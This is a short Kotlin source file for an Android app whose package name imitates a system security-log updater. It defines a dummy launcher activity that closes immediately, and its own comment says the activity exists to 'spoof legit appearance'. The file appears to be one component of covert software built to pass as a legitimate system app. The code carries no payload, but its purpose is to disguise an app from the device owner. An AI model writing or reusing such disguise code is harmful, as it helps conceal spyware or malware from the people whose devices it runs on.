// Optional dummy launcher to spoof legit appearance (never launched)
package com.android.seclogupd.ui

import android.app.Activity
import android.os.Bundle

class FakeLauncherActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        finish() // immediately close
    }
}